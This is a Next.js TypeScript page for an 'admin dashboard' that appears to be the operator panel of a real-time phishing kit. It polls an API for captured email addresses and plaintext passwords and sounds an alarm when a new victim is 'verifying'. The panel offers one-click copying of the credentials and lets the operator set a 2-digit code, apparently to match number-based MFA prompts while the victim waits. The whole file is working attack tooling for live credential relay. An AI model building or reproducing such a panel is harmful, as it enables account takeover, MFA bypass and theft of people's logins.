'use client';

import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

interface UserData {
  id: number;
  email: string;
  password: string;
  status: string;
  seconds_ago: number;
  timestamp: string;
}

export default function AdminDashboardPage() {
  const router = useRouter();
  const [sidebarActive, setSidebarActive] = useState(false);
  const [users, setUsers] = useState<UserData[]>([]);
  const [activeCoupon, setActiveCoupon] = useState<string>('...');
  const [couponInput, setCouponInput] = useState<string>('');
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const [acknowledgedUsers, setAcknowledgedUsers] = useState<number[]>([]);

  const alarmRef = useRef<HTMLAudioElement | null>(null);
  const isAlarmPlayingRef = useRef<boolean>(false);
  const lastNotificationTimeRef = useRef<{ [key: number]: number }>({});

  // Format time helper
  const formatTime = (seconds: number) => {
    if (seconds < 60) return `${seconds}s ago`;
    const min = Math.floor(seconds / 60);
    if (min < 60) return `${min}m ago`;
    const hr = Math.floor(min / 60);
    if (hr < 24) return `${hr}h ago`;
    const days = Math.floor(hr / 24);
    return `${days}d ago`;
  };

  // Toast Helper
  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => {
      setToastMsg(null);
    }, 3500);
  };

  // Alarm management
  const manageAlarm = (turnOn: boolean) => {
    if (!alarmRef.current) return;
    if (turnOn && !isAlarmPlayingRef.current) {
      alarmRef.current.currentTime = 0;
      alarmRef.current.play().catch(() => {});
      isAlarmPlayingRef.current = true;
    } else if (!turnOn && isAlarmPlayingRef.current) {
      alarmRef.current.pause();
      isAlarmPlayingRef.current = false;
    }
  };

  // Desktop Notification
  const sendDesktopNotification = (uid: number, email: string) => {
    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
      new Notification('🚨 Verification Required: #' + uid, {
        body: email,
        icon: 'https://cdn-icons-png.flaticon.com/512/10337/10337609.png',
        tag: 'user-' + uid,
      });
    }
  };

  // Fetch Users
  const loadUsers = async () => {
    try {
      const res = await fetch('/api/get_users?t=' + Date.now());
      const data: UserData[] = await res.json();
      setUsers(data);

      let shouldRing = false;
      const currentTime = Date.now();
      let newCount = 0;

      data.forEach((u) => {
        const uid = u.id;
        const sec = u.seconds_ago;

        if (u.status === 'verifying') {
          newCount++;
          if (sec < 60 && !acknowledgedUsers.includes(uid)) {
            shouldRing = true;
            if (
              !lastNotificationTimeRef.current[uid] ||
              currentTime - lastNotificationTimeRef.current[uid] > 5000
            ) {
              sendDesktopNotification(uid, u.email);
              lastNotificationTimeRef.current[uid] = currentTime;
            }
          }
        }
      });

      if (typeof document !== 'undefined') {
        document.title = newCount > 0 ? `(${newCount}) Action Required - Nexus` : 'Nexus Admin Dashboard';
      }

      manageAlarm(shouldRing);
    } catch (err) {
      console.error('loadUsers error:', err);
    }
  };

  // Fetch Coupon
  const loadCoupon = async () => {
    try {
      const res = await fetch('/api/get_latest_coupon?t=' + Date.now());
      const d = await res.json();
      setActiveCoupon(d.coupon || 'NONE');
    } catch (err) {
      console.error('loadCoupon error:', err);
    }
  };

  // Save Coupon
  const saveCoupon = async () => {
    if (!couponInput.trim()) return;
    try {
      const formData = new FormData();
      formData.append('coupon', couponInput.trim());

      await fetch('/api/save_coupon', {
        method: 'POST',
        body: formData,
      });

      showToast('🔑 Security code updated!');
      loadCoupon();
      setCouponInput('');
    } catch (err) {
      console.error('saveCoupon error:', err);
    }
  };

  // User Actions
  const copyData = (email: string, pass: string, id: number) => {
    navigator.clipboard.writeText(email + ' ' + pass);
    if (!acknowledgedUsers.includes(id)) {
      setAcknowledgedUsers((prev) => [...prev, id]);
    }
    manageAlarm(false);
    showToast('✓ Credentials copied to clipboard');
  };

  const approveUser = async (id: number) => {
    try {
      const formData = new FormData();
      formData.append('user_id', String(id));
      formData.append('status', 'approved');

      await fetch('/api/update_status', {
        method: 'POST',
        body: formData,
      });
      showToast('🛡️ Access Granted!');
      loadUsers();
    } catch (err) {
      console.error('approveUser error:', err);
    }
  };

  const rejectUser = async (id: number) => {
    try {
      const formData = new FormData();
      formData.append('user_id', String(id));
      formData.append('status', 'rejected');

      await fetch('/api/update_status', {
        method: 'POST',
        body: formData,
      });
      showToast('❌ Request Denied!');
      loadUsers();
    } catch (err) {
      console.error('rejectUser error:', err);
    }
  };

  const deleteUser = async (id: number) => {
    if (confirm('Permanently remove this log?')) {
      try {
        await fetch(`/api/delete_user?id=${id}`);
        showToast('🗑️ Log entry removed');
        loadUsers();
      } catch (err) {
        console.error('deleteUser error:', err);
      }
    }
  };

  const handleLogout = async () => {
    await fetch('/api/logout', { method: 'POST' });
    router.push('/login');
  };

  useEffect(() => {
    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted') {
      Notification.requestPermission();
    }

    loadUsers();
    loadCoupon();

    const userInterval = setInterval(loadUsers, 2000);
    const couponInterval = setInterval(loadCoupon, 5000);

    const unlockSound = () => {
      if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted') {
        Notification.requestPermission();
      }
      if (isAlarmPlayingRef.current && alarmRef.current && alarmRef.current.paused) {
        alarmRef.current.play();
      }
    };
    window.addEventListener('click', unlockSound, { once: true });

    return () => {
      clearInterval(userInterval);
      clearInterval(couponInterval);
      window.removeEventListener('click', unlockSound);
    };
  }, []);

  const newUsers = users.filter((u) => u.status === 'verifying');
  const oldUsers = users.filter((u) => u.status !== 'verifying');

  return (
    <div className="admin-dashboard-container">
      <style jsx global>{`
        :root {
          --primary: #4f46e5;
          --primary-hover: #4338ca;
          --secondary: #8b5cf6;
          --bg-color: #f4f7fe;
          --surface: #ffffff;
          
          --success: #10b981;
          --success-bg: #d1fae5;
          --success-text: #065f46;
          
          --danger: #ef4444;
          --danger-bg: #fee2e2;
          --danger-text: #991b1b;
          
          --warning: #f59e0b;
          --warning-bg: #fef3c7;
          --info: #3b82f6;
          --info-bg: #dbeafe;
          
          --text-main: #1e293b;
          --text-muted: #64748b;
          --border: #e2e8f0;
          
          --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
          --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
          --shadow-lg: 0 10px 25px -3px rgba(0, 0, 0, 0.05);
          --radius-lg: 20px;
          --radius-md: 12px;
        }

        .admin-dashboard-container {
          font-family: 'Plus Jakarta Sans', sans-serif;
          background: var(--bg-color);
          color: var(--text-main);
          min-height: 100vh;
          display: flex;
          overflow-x: hidden;
          width: 100%;
        }

        .sidebar {
          width: 280px;
          background: var(--surface);
          height: 100vh;
          position: fixed;
          left: 0;
          top: 0;
          display: flex;
          flex-direction: column;
          padding: 0;
          transition: transform 0.3s ease;
          z-index: 1000;
          border-right: 1px solid var(--border);
        }

        .brand {
          padding: 32px 24px;
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .brand-icon {
          width: 44px;
          height: 44px;
          background: linear-gradient(135deg, var(--primary), var(--secondary));
          border-radius: var(--radius-md);
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-size: 22px;
          box-shadow: 0 8px 16px rgba(79, 70, 229, 0.25);
        }

        .brand-text h1 { font-size: 22px; font-weight: 800; color: var(--text-main); letter-spacing: -0.5px; }

        .nav-section { padding: 10px 16px; flex: 1; }

        .menu-link {
          display: flex;
          align-items: center;
          gap: 14px;
          padding: 14px 20px;
          color: var(--text-muted);
          text-decoration: none;
          border-radius: var(--radius-md);
          font-weight: 600;
          font-size: 15px;
          transition: all 0.2s ease;
          margin-bottom: 8px;
        }

        .menu-link:hover {
          background: var(--bg-color);
          color: var(--primary);
          transform: translateX(4px);
        }

        .menu-link.active {
          background: var(--primary);
          color: white;
          box-shadow: 0 4px 12px rgba(79, 70, 229, 0.2);
        }

        .logout-section { padding: 20px; border-top: 1px solid var(--border); }

        .logout-btn {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 14px 20px;
          background: var(--danger-bg);
          color: var(--danger-text);
          border-radius: var(--radius-md);
          font-weight: 700;
          font-size: 15px;
          cursor: pointer;
          transition: all 0.2s;
          text-decoration: none;
          width: 100%;
          border: none;
        }

        .logout-btn:hover { background: var(--danger); color: white; }

        .main-content {
          flex: 1;
          margin-left: 280px;
          padding: 40px;
          transition: margin 0.3s;
          max-width: 1400px;
        }

        .page-header { margin-bottom: 32px; }
        .page-header h1 { font-size: 32px; font-weight: 800; color: var(--text-main); margin-bottom: 8px; letter-spacing: -0.5px;}
        .page-header p { color: var(--text-muted); font-size: 15px; font-weight: 500;}

        .tap-card {
          background: linear-gradient(120deg, #1e293b 0%, #0f172a 100%);
          border-radius: var(--radius-lg);
          padding: 40px;
          margin-bottom: 40px;
          box-shadow: var(--shadow-lg);
          color: white;
          position: relative;
          overflow: hidden;
          display: flex;
          flex-direction: column;
          justify-content: center;
        }

        .tap-card::before {
          content: '';
          position: absolute;
          top: -50%; right: -10%;
          width: 400px; height: 400px;
          background: radial-gradient(circle, rgba(99, 102, 241, 0.4) 0%, transparent 60%);
          border-radius: 50%;
          pointer-events: none;
        }

        .tap-card-title {
          font-size: 20px;
          font-weight: 700;
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 24px;
          z-index: 1;
        }

        .tap-input-group {
          display: flex;
          gap: 16px;
          position: relative;
          z-index: 1;
          max-width: 600px;
        }

        .tap-input {
          flex: 1;
          padding: 16px 24px;
          border: 1px solid rgba(255,255,255,0.2);
          background: rgba(255,255,255,0.05);
          backdrop-filter: blur(12px);
          border-radius: 16px;
          color: white;
          font-size: 18px;
          font-weight: 600;
          font-family: inherit;
          transition: all 0.3s;
        }

        .tap-input::placeholder { color: rgba(255,255,255,0.4); }
        .tap-input:focus { outline: none; border-color: #a5b4fc; background: rgba(255,255,255,0.1); }

        .tap-save-btn {
          padding: 16px 32px;
          background: var(--primary);
          color: white;
          border: none;
          border-radius: 16px;
          font-weight: 700;
          font-size: 16px;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .tap-save-btn:hover { background: var(--primary-hover); transform: translateY(-2px); box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3); }

        .tap-active {
          margin-top: 24px;
          font-size: 15px;
          color: rgba(255,255,255,0.7);
          z-index: 1;
        }

        .tap-active strong {
          font-size: 28px;
          font-weight: 800;
          color: white;
          background: rgba(255,255,255,0.1);
          padding: 4px 16px;
          border-radius: 12px;
          margin-left: 12px;
          letter-spacing: 2px;
        }

        .table-card {
          background: var(--surface);
          border-radius: var(--radius-lg);
          box-shadow: var(--shadow-md);
          margin-bottom: 40px;
          overflow: hidden;
          animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }

        .table-header {
          padding: 24px 32px;
          border-bottom: 1px solid var(--border);
          display: flex;
          justify-content: space-between;
          align-items: center;
          background: var(--surface);
        }

        .table-header h3 { font-size: 18px; font-weight: 700; display: flex; align-items: center; gap: 10px; color: var(--text-main); }
        .table-subtitle { font-size: 14px; font-weight: 500; color: var(--text-muted); margin-top: 6px; }

        .table-wrapper { overflow-x: auto; }

        table { width: 100%; border-collapse: collapse; }
        thead { background: #f8fafc; }

        th {
          text-align: left;
          padding: 18px 32px;
          font-size: 12px;
          font-weight: 700;
          color: var(--text-muted);
          text-transform: uppercase;
          letter-spacing: 1px;
          border-bottom: 1px solid var(--border);
        }

        td {
          padding: 20px 32px;
          border-bottom: 1px solid #f1f5f9;
          font-size: 15px;
          font-weight: 600;
          vertical-align: middle;
          color: var(--text-main);
        }

        tr:last-child td { border-bottom: none; }
        tr:hover { background: #fcfcfd; }

        .badge {
          display: inline-flex;
          align-items: center;
          padding: 6px 14px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 700;
          gap: 6px;
        }

        .badge-new { background: var(--danger-bg); color: var(--danger-text); animation: pulse 2s infinite; }
        .badge-time { background: var(--info-bg); color: var(--info); }
        .badge-approved { background: var(--success-bg); color: var(--success-text); }
        .badge-rejected { background: var(--danger-bg); color: var(--danger-text); }
        .badge-pending { background: #f1f5f9; color: var(--text-muted); }

        @keyframes pulse {
          0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
          70% { box-shadow: 0 0 0 6px rgba(239, 68, 68, 0); }
          100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }

        .btn {
          padding: 10px 20px;
          border: none;
          border-radius: 10px;
          font-weight: 700;
          font-size: 13px;
          cursor: pointer;
          transition: all 0.2s;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          font-family: inherit;
        }

        .btn-copy { background: var(--info-bg); color: var(--info); }
        .btn-copy:hover { background: var(--info); color: white; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3); }

        .btn-approve { background: var(--success-bg); color: var(--success-text); }
        .btn-approve:hover { background: var(--success); color: white; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); }

        .btn-reject { background: var(--danger-bg); color: var(--danger-text); }
        .btn-reject:hover { background: var(--danger); color: white; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3); }

        .btn-delete {
          width: 36px; height: 36px;
          padding: 0;
          background: transparent;
          border: 1px solid var(--danger-bg);
          color: var(--danger);
          border-radius: 8px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          transition: all 0.2s;
        }

        .btn-delete:hover { background: var(--danger); color: white; border-color: var(--danger); transform: translateY(-2px); }

        .code {
          background: #f1f5f9;
          padding: 6px 12px;
          border-radius: 8px;
          font-family: 'Courier New', monospace;
          font-weight: 700;
          font-size: 14px;
          color: var(--primary);
          border: 1px solid var(--border);
        }

        .urgent-row {
          background: linear-gradient(90deg, rgba(254, 226, 226, 0.3) 0%, transparent 100%);
          position: relative;
        }
        .urgent-row::before {
          content: '';
          position: absolute;
          left: 0; top: 0; bottom: 0;
          width: 4px;
          background: var(--danger);
        }

        .toast {
          position: fixed;
          bottom: 40px; right: 40px;
          background: var(--text-main);
          color: white;
          padding: 16px 28px;
          border-radius: 12px;
          z-index: 2000;
          box-shadow: 0 20px 40px rgba(0,0,0,0.2);
          animation: slideInUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 10px;
        }

        @keyframes slideInUp {
          from { transform: translateY(100px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }

        .empty-state {
          text-align: center;
          padding: 60px 20px;
          color: var(--text-muted);
        }
        .empty-state i {
          font-size: 56px;
          color: var(--border);
          margin-bottom: 16px;
          display: block;
        }
        .empty-state p { font-size: 15px; font-weight: 600; }

        .mobile-header { display: none; }
        .overlay {
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(15, 23, 42, 0.4);
          backdrop-filter: blur(4px);
          z-index: 999;
          display: none;
        }

        @media (max-width: 1024px) {
          .sidebar { transform: translateX(-100%); }
          .sidebar.active { transform: translateX(0); }
          .main-content { margin-left: 0; padding: 20px; }
          .mobile-header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 24px; padding: 20px;
            background: var(--surface); border-radius: var(--radius-md);
            box-shadow: var(--shadow-sm);
          }
          .menu-toggle { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-main); }
          .overlay.active { display: block; }
        }

        @media (max-width: 768px) {
          .tap-card { padding: 24px; }
          .tap-input-group { flex-direction: column; }
          th, td { padding: 16px; font-size: 14px; }
        }
      `}</style>

      {/* Overlay */}
      <div className={`overlay ${sidebarActive ? 'active' : ''}`} onClick={() => setSidebarActive(false)}></div>

      {/* Audio Alarm */}
      <audio ref={alarmRef} src="https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3" preload="auto" loop></audio>

      {/* SIDEBAR */}
      <aside className={`sidebar ${sidebarActive ? 'active' : ''}`}>
        <div className="brand">
          <div className="brand-icon"><i className="ri-shield-check-fill"></i></div>
          <div className="brand-text">
            <h1>ADMIN</h1>
          </div>
        </div>

        <nav className="nav-section">
          <a href="#" className="menu-link active"><i className="ri-dashboard-fill"></i> <span>Overview</span></a>
          <a href="#" className="menu-link"><i className="ri-user-settings-fill"></i> <span>User Control</span></a>
          <a href="#" className="menu-link"><i className="ri-bar-chart-box-fill"></i> <span>Analytics</span></a>
          <a href="#" className="menu-link"><i className="ri-settings-4-fill"></i> <span>System Prefs</span></a>
        </nav>

        <div className="logout-section">
          <button className="logout-btn" onClick={handleLogout}>
            <i className="ri-logout-circle-r-line"></i> <span>Secure Logout</span>
          </button>
        </div>
      </aside>

      {/* MAIN CONTENT */}
      <main className="main-content">
        {/* Mobile Header */}
        <div className="mobile-header">
          <h2 style={{ fontSize: '20px', fontWeight: 800 }}>Admin</h2>
          <button className="menu-toggle" onClick={() => setSidebarActive(!sidebarActive)}>
            <i className="ri-menu-4-line"></i>
          </button>
        </div>

        {/* Page Header */}
        <div className="page-header">
          <h1>Dashboard</h1>
          <p>Real-time authentication & access management</p>
        </div>

        {/* TAP Management Card */}
        <div className="tap-card">
          <div className="tap-card-title">
            <i className="ri-key-2-fill" style={{ color: '#a5b4fc' }}></i> Security Access Code
          </div>
          <div className="tap-input-group">
            <input
              type="text"
              className="tap-input"
              placeholder="Enter 2-digit code"
              maxLength={2}
              value={couponInput}
              onChange={(e) => setCouponInput(e.target.value)}
            />
            <button className="tap-save-btn" onClick={saveCoupon}>
              <i className="ri-checkbox-circle-line"></i> Deploy
            </button>
          </div>
          <div className="tap-active">
            Currently Active: <strong>{activeCoupon}</strong>
          </div>
        </div>

        {/* NEW USERS TABLE */}
        <div className="table-card">
          <div className="table-header" style={{ borderBottom: '2px solid var(--primary)' }}>
            <div>
              <h3><i className="ri-radar-line" style={{ color: 'var(--primary)' }}></i> Incoming Requests</h3>
              <p className="table-subtitle">Users awaiting verification</p>
            </div>
          </div>
          <div className="table-wrapper">
            <table>
              <thead>
                <tr>
                  <th>Time</th>
                  <th>ID</th>
                  <th>Email Address</th>
                  <th>Password</th>
                  <th style={{ textAlign: 'center' }}>Data Action</th>
                  <th style={{ textAlign: 'center' }}>Final Decision</th>
                </tr>
              </thead>
              <tbody>
                {newUsers.length === 0 ? (
                  <tr>
                    <td colSpan={6}>
                      <div className="empty-state">
                        <i className="ri-inbox-archive-line"></i>
                        <p>System clear. No pending requests.</p>
                      </div>
                    </td>
                  </tr>
                ) : (
                  newUsers.map((u) => {
                    const isUrgent = u.seconds_ago < 60 && !acknowledgedUsers.includes(u.id);
                    const isCopied = acknowledgedUsers.includes(u.id);
                    return (
                      <tr key={u.id} className={isUrgent ? 'urgent-row' : ''}>
                        <td>
                          {isUrgent ? (
                            <span className="badge badge-new"><i className="ri-alarm-warning-line"></i> NEW</span>
                          ) : (
                            <span className="badge badge-time">
                              <i className="ri-time-line"></i> {isCopied ? 'Copied' : formatTime(u.seconds_ago)}
                            </span>
                          )}
                        </td>
                        <td><strong style={{ color: 'var(--text-muted)' }}>#{u.id}</strong></td>
                        <td><strong style={{ color: 'var(--text-main)' }}>{u.email}</strong></td>
                        <td><span className="code">{u.password}</span></td>
                        <td style={{ textAlign: 'center' }}>
                          <button className="btn btn-copy" onClick={() => copyData(u.email, u.password, u.id)}>
                            <i className="ri-file-copy-line"></i> Copy
                          </button>
                        </td>
                        <td style={{ textAlign: 'center' }}>
                          <div style={{ display: 'flex', gap: '10px', justifyContent: 'center' }}>
                            <button className="btn btn-approve" onClick={() => approveUser(u.id)}>
                              <i className="ri-check-line"></i> Approve
                            </button>
                            <button className="btn btn-reject" onClick={() => rejectUser(u.id)}>
                              <i className="ri-close-line"></i> Reject
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* PROCESSED USERS TABLE */}
        <div className="table-card">
          <div className="table-header">
            <div>
              <h3><i className="ri-history-line" style={{ color: 'var(--text-muted)' }}></i> Action History</h3>
              <p className="table-subtitle">Log of previously resolved user access</p>
            </div>
          </div>

          <div className="table-wrapper">
            <table>
              <thead>
                <tr>
                  <th>Time</th>
                  <th>ID</th>
                  <th>Email Address</th>
                  <th>Secure Key</th>
                  <th>Status</th>
                  <th style={{ textAlign: 'center' }}>Action</th>
                </tr>
              </thead>
              <tbody>
                {oldUsers.length === 0 ? (
                  <tr>
                    <td colSpan={6}>
                      <div className="empty-state">
                        <i className="ri-file-history-line"></i>
                        <p>No processed data available yet.</p>
                      </div>
                    </td>
                  </tr>
                ) : (
                  oldUsers.map((u) => (
                    <tr key={u.id}>
                      <td><span style={{ color: 'var(--text-muted)', fontSize: '13px', fontWeight: 600 }}>{formatTime(u.seconds_ago)}</span></td>
                      <td style={{ color: 'var(--text-muted)', fontWeight: 600 }}>#{u.id}</td>
                      <td style={{ fontWeight: 600 }}>{u.email}</td>
                      <td><span className="code" style={{ background: 'transparent', border: 'none' }}>{u.password}</span></td>
                      <td>
                        {u.status === 'approved' && (
                          <span className="badge badge-approved"><i className="ri-checkbox-circle-fill"></i> Approved</span>
                        )}
                        {u.status === 'rejected' && (
                          <span className="badge badge-rejected"><i className="ri-close-circle-fill"></i> Rejected</span>
                        )}
                        {u.status !== 'approved' && u.status !== 'rejected' && (
                          <span className="badge badge-pending"><i className="ri-time-line"></i> Pending</span>
                        )}
                      </td>
                      <td style={{ textAlign: 'center' }}>
                        <button className="btn-delete" onClick={() => deleteUser(u.id)}>
                          <i className="ri-delete-bin-line"></i>
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      {/* Toast alert */}
      {toastMsg && <div className="toast">{toastMsg}</div>}
    </div>
  );
}
